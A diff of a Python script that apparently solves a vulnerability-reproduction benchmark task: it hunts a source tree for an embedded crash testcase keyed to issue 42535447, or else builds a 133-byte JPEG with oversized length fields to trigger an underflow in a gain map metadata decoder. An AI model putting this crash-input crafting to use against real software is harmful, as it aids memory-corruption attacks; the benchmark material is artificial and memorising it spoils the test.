@@ -1,333 +1,354 @@
 import os
 import re
 import tarfile
-import tempfile
-from typing import Iterable, Optional, Tuple
+from typing import Dict, Iterable, List, Optional, Tuple
 
 
-def _is_within_directory(directory: str, target: str) -> bool:
-    abs_directory = os.path.abspath(directory)
-    abs_target = os.path.abspath(target)
-    return os.path.commonpath([abs_directory]) == os.path.commonpath([abs_directory, abs_target])
+def _is_probably_text(data: bytes) -> bool:
+    if not data:
+        return True
+    if b"\x00" in data:
+        return False
+    sample = data[:2048]
+    printable = sum(1 for b in sample if 9 <= b <= 13 or 32 <= b <= 126)
+    return printable / max(1, len(sample)) > 0.97
 
 
-def _safe_extract_tar(tar: tarfile.TarFile, path: str) -> None:
-    for member in tar.getmembers():
-        member_path = os.path.join(path, member.name)
-        if not _is_within_directory(path, member_path):
+def _iter_tar_files(tar_path: str) -> Iterable[Tuple[str, int, bytes]]:
+    with tarfile.open(tar_path, "r:*") as tf:
+        for m in tf.getmembers():
+            if not m.isfile():
+                continue
+            if m.size < 0:
+                continue
+            f = tf.extractfile(m)
+            if f is None:
+                continue
+            try:
+                data = f.read()
+            finally:
+                try:
+                    f.close()
+                except Exception:
+                    pass
+            yield m.name, m.size, data
+
+
+def _iter_dir_files(root: str) -> Iterable[Tuple[str, int, bytes]]:
+    for base, _, files in os.walk(root):
+        for fn in files:
+            p = os.path.join(base, fn)
+            try:
+                st = os.stat(p)
+            except Exception:
+                continue
+            if not os.path.isfile(p):
+                continue
+            size = st.st_size
+            try:
+                with open(p, "rb") as f:
+                    data = f.read()
+            except Exception:
+                continue
+            rel = os.path.relpath(p, root)
+            yield rel, size, data
+
+
+def _iter_files(src_path: str) -> Iterable[Tuple[str, int, bytes]]:
+    if os.path.isdir(src_path):
+        yield from _iter_dir_files(src_path)
+    else:
+        yield from _iter_tar_files(src_path)
+
+
+def _candidate_score(name: str, size: int, data: bytes) -> int:
+    lname = name.lower()
+    score = 0
+
+    # Strong hints
+    if "42535447" in lname:
+        score += 200000
+    if any(k in lname for k in ("clusterfuzz", "testcase", "crash", "poc", "repro", "ossfuzz", "minimized")):
+        score += 100000
+    if any(k in lname for k in ("gainmap", "uhdr", "hdr", "gmdb", "gmap", "metadata")):
+        score += 20000
+
+    # Prefer exact size match
+    if size == 133:
+        score += 5000
+    elif 120 <= size <= 160:
+        score += 1000
+
+    # Prefer binary over text
+    if _is_probably_text(data):
+        score -= 50000
+    else:
+        score += 5000
+
+    # Favor typical file signatures
+    if data.startswith(b"\xFF\xD8"):
+        score += 5000
+    if data.startswith(b"\x89PNG\r\n\x1a\n"):
+        score += 2000
+    if data.startswith(b"ftyp") or (len(data) >= 8 and data[4:8] == b"ftyp"):
+        score += 2000
+
+    # Prefer smaller (but not tiny text)
+    score += max(0, 20000 - size)
+    return score
+
+
+def _pick_embedded_poc(files: List[Tuple[str, int, bytes]]) -> Optional[bytes]:
+    best = None
+    best_score = None
+    for name, size, data in files:
+        if size == 0:
+            continue
+
+        # Skip obvious sources/config/docs to avoid selecting tiny readmes
+        lname = name.lower()
+        if any(lname.endswith(ext) for ext in (".c", ".cc", ".cpp", ".h", ".hpp", ".inc", ".inl", ".md", ".rst", ".txt", ".cmake", ".bazel", ".gn", ".gni", ".py", ".java", ".kt", ".go", ".rs", ".m", ".mm")):
+            continue
+
+        if size > 2_000_000:
+            continue
+
+        s = _candidate_score(name, size, data)
+        if best is None or s > best_score:
+            best = data
+            best_score = s
+
+    return best
+
+
+def _extract_sources_text(files: List[Tuple[str, int, bytes]]) -> Dict[str, str]:
+    out: Dict[str, str] = {}
+    for name, size, data in files:
+        lname = name.lower()
+        if not any(lname.endswith(ext) for ext in (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".hxx")):
+            continue
+        if size <= 0 or size > 2_000_000:
+            continue
+        if b"\x00" in data:
             continue
         try:
-            tar.extract(member, path=path, set_attrs=False)
+            txt = data.decode("utf-8", errors="ignore")
         except Exception:
-            pass
+            continue
+        out[name] = txt
+    return out
 
 
-def _prepare_root(src_path: str, tmpdir: str) -> str:
-    if os.path.isdir(src_path):
-        return src_path
-    if tarfile.is_tarfile(src_path):
-        with tarfile.open(src_path, "r:*") as tar:
-            _safe_extract_tar(tar, tmpdir)
-        try:
-            entries = [os.path.join(tmpdir, x) for x in os.listdir(tmpdir)]
-            dirs = [p for p in entries if os.path.isdir(p)]
-            if len(dirs) == 1 and all(os.path.commonpath([dirs[0], p]) == dirs[0] for p in entries):
-                return dirs[0]
-        except Exception:
-            pass
-        return tmpdir
-    return src_path
+def _find_gainmap_fuzzer(sources: Dict[str, str]) -> Optional[Tuple[str, str]]:
+    best = None
+    best_score = -1
+    for name, txt in sources.items():
+        if "LLVMFuzzerTestOneInput" not in txt:
+            continue
+        lname = name.lower()
+        s = 0
+        if "gainmap" in txt.lower() or "gainmap" in lname:
+            s += 50
+        if "decodegainmapmetadata" in txt.lower():
+            s += 100
+        if "jpeg" in txt.lower() or "jpg" in txt.lower():
+            s += 10
+        if "uhdr" in txt.lower():
+            s += 10
+        if s > best_score:
+            best_score = s
+            best = (name, txt)
+    return best
 
 
-def _iter_files(root: str) -> Iterable[str]:
-    for dirpath, dirnames, filenames in os.walk(root, topdown=True, followlinks=False):
-        dirnames[:] = [d for d in dirnames if d not in (".git", ".hg", ".svn", "__pycache__")]
-        for fn in filenames:
-            yield os.path.join(dirpath, fn)
+def _find_decode_gainmap_source(sources: Dict[str, str]) -> Optional[Tuple[str, str]]:
+    best = None
+    best_score = -1
+    for name, txt in sources.items():
+        low = txt.lower()
+        if "decodegainmapmetadata" not in low:
+            continue
+        s = 0
+        if re.search(r"\bdecodeGainmapMetadata\s*\(", txt):
+            s += 100
+        if "gainmap" in name.lower():
+            s += 30
+        if "metadata" in name.lower():
+            s += 10
+        if s > best_score:
+            best_score = s
+            best = (name, txt)
+    return best
 
 
-def _read_bytes(path: str, max_size: int = 10_000_000) -> Optional[bytes]:
-    try:
-        st = os.stat(path)
-        if not os.path.isfile(path) or st.st_size <= 0 or st.st_size > max_size:
-            return None
-        with open(path, "rb") as f:
-            return f.read()
-    except Exception:
+def _extract_memcmp_literals(func_text: str) -> List[Tuple[int, bytes]]:
+    # Try to extract memcmp(data + N, "MAGIC", K) patterns
+    res: List[Tuple[int, bytes]] = []
+    # memcmp(data + 4, "UHDR", 4)
+    for m in re.finditer(r"memcmp\s*\(\s*([A-Za-z_]\w*)\s*(?:\+\s*(\d+))?\s*,\s*\"([^\"]{1,64})\"\s*,\s*(\d+)\s*\)", func_text):
+        off = int(m.group(2) or "0")
+        lit = m.group(3)
+        n = int(m.group(4))
+        b = lit.encode("latin1", errors="ignore")
+        if n <= len(b):
+            b = b[:n]
+        else:
+            b = b + (b"\x00" * (n - len(b)))
+        if 0 <= off <= 4096 and 1 <= len(b) <= 64:
+            res.append((off, b))
+
+    # strncmp((const char*)data + N, "MAGIC", K)
+    for m in re.finditer(r"strncmp\s*\(\s*\(.*?\)\s*([A-Za-z_]\w*)\s*(?:\+\s*(\d+))?\s*,\s*\"([^\"]{1,64})\"\s*,\s*(\d+)\s*\)", func_text, flags=re.DOTALL):
+        off = int(m.group(2) or "0")
+        lit = m.group(3)
+        n = int(m.group(4))
+        b = lit.encode("latin1", errors="ignore")
+        if n <= len(b):
+            b = b[:n]
+        else:
+            b = b + (b"\x00" * (n - len(b)))
+        if 0 <= off <= 4096 and 1 <= len(b) <= 64:
+            res.append((off, b))
+
+    # Remove duplicates, keep stable order
+    seen = set()
+    uniq: List[Tuple[int, bytes]] = []
+    for off, b in res:
+        key = (off, b)
+        if key in seen:
+            continue
+        seen.add(key)
+        uniq.append((off, b))
+    return uniq
+
+
+def _extract_function_block(txt: str, func_name: str) -> Optional[str]:
+    # Roughly extract function definition block starting at first occurrence.
+    idx = txt.find(func_name)
+    if idx < 0:
         return None
-
-
-def _read_text(path: str, max_size: int = 1_000_000) -> Optional[str]:
-    try:
-        st = os.stat(path)
-        if not os.path.isfile(path) or st.st_size <= 0 or st.st_size > max_size:
-            return None
-        with open(path, "rb") as f:
-            raw = f.read()
-        return raw.decode("utf-8", errors="ignore")
-    except Exception:
+    # Find nearest preceding line start
+    start = txt.rfind("\n", 0, idx)
+    if start < 0:
+        start = 0
+    else:
+        start += 1
+    # Find first '{' after func name
+    brace = txt.find("{", idx)
+    if brace < 0:
         return None
-
-
-def _trim_jpeg(data: bytes) -> bytes:
-    if len(data) >= 4 and data[:2] == b"\xff\xd8":
-        idx = data.rfind(b"\xff\xd9")
-        if idx != -1:
-            return data[: idx + 2]
-    return data
-
-
-def _looks_like_interesting_binary(data: bytes) -> bool:
-    if len(data) < 8:
-        return False
-    if data[:2] == b"\xff\xd8":
-        return True
-    if data.startswith(b"\x89PNG\r\n\x1a\n"):
-        return True
-    if len(data) >= 12 and data[4:8] == b"ftyp":
-        return True
-    if data.startswith(b"RIFF") and data[8:12] in (b"WEBP", b"AVI ", b"WAVE"):
-        return True
-    if data.startswith(b"GIF87a") or data.startswith(b"GIF89a"):
-        return True
-    if data.startswith(b"\x00\x00\x00\x0cJXL ") or data.startswith(b"\xff\x0a"):
-        return True
-    return False
-
-
-def _find_file_with_issue_id(root: str, issue_id: str) -> Optional[bytes]:
-    best: Optional[Tuple[int, int, str]] = None  # (priority, size, path)
-    for p in _iter_files(root):
-        base = os.path.basename(p).lower()
-        if issue_id in base or issue_id in p.lower():
-            b = _read_bytes(p, max_size=50_000_000)
-            if not b:
-                continue
-            size = len(b)
-            pr = 0
-            if best is None or (pr, size) < (best[0], best[1]):
-                best = (pr, size, p)
-    if best:
-        b = _read_bytes(best[2], max_size=50_000_000)
-        if b is not None:
-            return _trim_jpeg(b)
-    return None
-
-
-def _extract_braced_block(text: str, start_idx: int) -> Optional[Tuple[int, int, str]]:
-    i = text.find("{", start_idx)
-    if i == -1:
-        return None
+    i = brace
     depth = 0
-    for j in range(i, min(len(text), i + 2_000_000)):
-        c = text[j]
+    while i < len(txt):
+        c = txt[i]
         if c == "{":
             depth += 1
         elif c == "}":
             depth -= 1
             if depth == 0:
-                return (i, j, text[i + 1 : j])
+                return txt[start:i + 1]
+        i += 1
     return None
 
 
-def _parse_c_byte_array(block: str) -> Optional[bytes]:
-    nums = re.findall(r"0x[0-9a-fA-F]+|\b\d+\b", block)
-    if not nums:
-        return None
-    out = bytearray()
-    for t in nums:
-        if t.lower().startswith("0x"):
-            v = int(t, 16)
-        else:
-            v = int(t, 10)
-        if v < 0 or v > 255:
-            return None
-        out.append(v)
-        if len(out) > 50_000_000:
-            return None
-    return bytes(out) if out else None
+def _make_jpeg_with_app(marker: int, appdata: bytes) -> bytes:
+    # marker: 0xE1 for APP1 etc.
+    if not (0xE0 <= marker <= 0xEF):
+        marker = 0xE1
+    seglen = len(appdata) + 2
+    if seglen > 0xFFFF:
+        appdata = appdata[:0xFFFF - 2]
+        seglen = len(appdata) + 2
+    return b"\xFF\xD8" + bytes([0xFF, marker]) + seglen.to_bytes(2, "big") + appdata + b"\xFF\xD9"
 
 
-_C_ESC_MAP = {
-    "a": 0x07,
-    "b": 0x08,
-    "f": 0x0c,
-    "n": 0x0a,
-    "r": 0x0d,
-    "t": 0x09,
-    "v": 0x0b,
-    "\\": 0x5c,
-    "'": 0x27,
-    '"': 0x22,
-    "?": 0x3f,
-    "0": 0x00,
-}
+def _synthesize_poc(sources: Dict[str, str]) -> bytes:
+    fuzzer = _find_gainmap_fuzzer(sources)
+    dec = _find_decode_gainmap_source(sources)
 
+    fuzzer_txt = fuzzer[1] if fuzzer else ""
+    dec_txt = dec[1] if dec else ""
+    func_block = None
+    if dec_txt:
+        func_block = _extract_function_block(dec_txt, "decodeGainmapMetadata")
+        if func_block is None:
+            func_block = dec_txt
 
-def _decode_c_escaped_string(s: str) -> Optional[bytes]:
-    out = bytearray()
-    i = 0
-    n = len(s)
-    while i < n:
-        c = s[i]
-        if c != "\\":
-            out.append(ord(c) & 0xFF)
-            i += 1
-            continue
-        i += 1
-        if i >= n:
-            break
-        c2 = s[i]
-        if c2 == "x":
-            i += 1
-            hx = ""
-            while i < n and len(hx) < 2 and s[i] in "0123456789abcdefABCDEF":
-                hx += s[i]
-                i += 1
-            if not hx:
-                out.append(ord("x"))
-            else:
-                out.append(int(hx, 16))
-            continue
-        if c2 in "01234567":
-            octs = c2
-            i += 1
-            for _ in range(2):
-                if i < n and s[i] in "01234567":
-                    octs += s[i]
-                    i += 1
-                else:
-                    break
-            out.append(int(octs, 8) & 0xFF)
-            continue
-        if c2 in _C_ESC_MAP:
-            out.append(_C_ESC_MAP[c2])
-            i += 1
-            continue
-        out.append(ord(c2) & 0xFF)
-        i += 1
-    return bytes(out)
+    wants_jpeg = False
+    low_fuzzer = fuzzer_txt.lower()
+    if any(k in low_fuzzer for k in ("jpeg", "jpg", "libjpeg", "jpegr", "soi", "app1", "app2")):
+        wants_jpeg = True
 
+    direct_call = False
+    if "decodegainmapmetadata" in low_fuzzer and "LLVMFuzzerTestOneInput" in fuzzer_txt:
+        # If the fuzzer text contains a direct call, assume raw buffer
+        if re.search(r"\bdecodeGainmapMetadata\s*\(\s*data\s*,\s*size", fuzzer_txt):
+            direct_call = True
 
-def _find_embedded_poc_near_issue_id(root: str, issue_id: str) -> Optional[bytes]:
-    best: Optional[bytes] = None
+    # Build appdata/metadata blob
+    target_total = 133
+    if wants_jpeg and not direct_call:
+        appdata_len = max(32, target_total - 8)  # SOI(2)+APP(4)+EOI(2)=8
+    else:
+        appdata_len = 133
 
-    for p in _iter_files(root):
-        ext = os.path.splitext(p)[1].lower()
-        if ext not in (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".m", ".mm", ".txt", ".md", ".rst"):
-            continue
-        txt = _read_text(p, max_size=2_000_000)
-        if not txt or issue_id not in txt:
-            continue
+    blob = bytearray(b"\x00" * appdata_len)
 
-        idx = 0
-        while True:
-            idx = txt.find(issue_id, idx)
-            if idx == -1:
-                break
+    # Try to satisfy magic checks if any
+    magics: List[Tuple[int, bytes]] = []
+    if func_block:
+        magics = _extract_memcmp_literals(func_block)
+    if not magics:
+        # Common possibilities
+        magics = [
+            (0, b"UHDR"),
+            (0, b"GAINMAP"),
+            (0, b"HDRGM"),
+            (0, b"GMAP"),
+        ]
 
-            blk = _extract_braced_block(txt, idx)
-            if blk is not None:
-                arr = _parse_c_byte_array(blk[2])
-                if arr:
-                    arr = _trim_jpeg(arr)
-                    if best is None or len(arr) < len(best):
-                        best = arr
+    for off, b in magics[:4]:
+        if off + len(b) <= len(blob):
+            blob[off:off + len(b)] = b
 
-            # Also try to decode nearby C string literals with escapes
-            window_start = max(0, idx - 5000)
-            window_end = min(len(txt), idx + 5000)
-            window = txt[window_start:window_end]
-            for m in re.finditer(r'"(?:\\.|[^"\\])*"', window):
-                lit = m.group(0)[1:-1]
-                if "\\x" not in lit and "\\0" not in lit and "\\\\" not in lit:
-                    continue
-                dec = _decode_c_escaped_string(lit)
-                if dec and len(dec) >= 8:
-                    dec = _trim_jpeg(dec)
-                    if best is None or len(dec) < len(best):
-                        best = dec
+    # If it appears to parse XMP from APP1, include common XMP header too (harmless otherwise)
+    xmp_hdr = b"http://ns.adobe.com/xap/1.0/\x00"
+    if len(xmp_hdr) + 4 <= len(blob) and ("xap/1.0" in (func_block or "").lower() or "xmp" in (func_block or "").lower()):
+        blob[0:len(xmp_hdr)] = xmp_hdr
 
-            idx += len(issue_id)
+    # Inject several large offsets/lengths at plausible positions to provoke unsigned underflow usage.
+    # Use 0xFFFFFFFF and 0xFFFFFFF0 patterns.
+    big_vals = [b"\xFF\xFF\xFF\xFF", b"\xFF\xFF\xFF\xF0", b"\xF0\xFF\xFF\xFF"]
+    positions = [4, 8, 12, 16, 20, 24, 28, 32, 40, 48, 56, 64, 72, 80, 88, 96]
+    for i, pos in enumerate(positions):
+        if pos + 4 <= len(blob):
+            blob[pos:pos + 4] = big_vals[i % len(big_vals)]
 
-    return best
+    # Also plant some "reasonable" versions if code checks for small numbers
+    for pos in (4, 5, 6, 7):
+        if pos < len(blob):
+            blob[pos] = 0x00
 
+    # Put a small length somewhere too, if decoder expects it (avoid immediate huge allocations if any)
+    for pos in (8, 12, 16):
+        if pos + 2 <= len(blob):
+            blob[pos:pos + 2] = b"\x00\x01"
 
-def _find_small_interesting_file(root: str) -> Optional[bytes]:
-    best: Optional[Tuple[int, int, str]] = None  # (priority, size, path)
-    for p in _iter_files(root):
-        try:
-            st = os.stat(p)
-        except Exception:
-            continue
-        if not os.path.isfile(p):
-            continue
-        size = st.st_size
-        if size <= 0 or size > 4096:
-            continue
-        base = os.path.basename(p).lower()
-        pr = 5
-        if any(k in base for k in ("poc", "crash", "repro", "regress", "ossfuzz", "oss-fuzz", "issue")):
-            pr = 3
-        if size == 133:
-            pr = min(pr, 2)
-        b = _read_bytes(p, max_size=4096)
-        if not b:
-            continue
-        if _looks_like_interesting_binary(b):
-            pr = min(pr, 1)
-        if best is None or (pr, size) < (best[0], best[1]):
-            best = (pr, size, p)
-    if best:
-        b = _read_bytes(best[2], max_size=4096)
-        if b is not None:
-            return _trim_jpeg(b)
-    return None
+    raw = bytes(blob)
 
-
-def _default_poc_133() -> bytes:
-    total_len = 133
-    soi = b"\xff\xd8"
-    eoi = b"\xff\xd9"
-    xmp_header = b"http://ns.adobe.com/xap/1.0/\x00"
-    data_len = total_len - (2 + 2 + 2 + 2)  # SOI + APP1 marker + APP1 length + EOI
-    if data_len < len(xmp_header):
-        data_len = len(xmp_header)
-    payload_len = data_len - len(xmp_header)
-    payload_base = (
-        b"<x:xmpmeta><rdf:RDF><rdf:Description "
-        b"xmlns:hdrgm='http://ns.adobe.com/hdr-gain-map/1.0/' "
-        b"hdrgm:Version='1.0'"
-    )
-    payload = payload_base[:payload_len].ljust(payload_len, b" ")
-    app1_data = xmp_header + payload
-    app1_len_field = (len(app1_data) + 2).to_bytes(2, "big", signed=False)
-    out = soi + b"\xff\xe1" + app1_len_field + app1_data + eoi
-    if len(out) < total_len:
-        out = out + (b"\x00" * (total_len - len(out)))
-    elif len(out) > total_len:
-        out = out[:total_len]
-        if out[-2:] != eoi:
-            out = out[:-2] + eoi
-    return out
+    if wants_jpeg and not direct_call:
+        # Use APP1 by default
+        return _make_jpeg_with_app(0xE1, raw)
+    return raw
 
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        issue_id = "42535447"
-        with tempfile.TemporaryDirectory() as td:
-            root = _prepare_root(src_path, td)
+        files = list(_iter_files(src_path))
 
-            b = _find_file_with_issue_id(root, issue_id)
-            if b:
-                return b
+        embedded = _pick_embedded_poc(files)
+        if embedded is not None:
+            return embedded
 
-            b = _find_embedded_poc_near_issue_id(root, issue_id)
-            if b:
-                return b
-
-            b = _find_small_interesting_file(root)
-            if b:
-                return b
-
-        return _default_poc_133()
+        sources = _extract_sources_text(files)
+        return _synthesize_poc(sources)
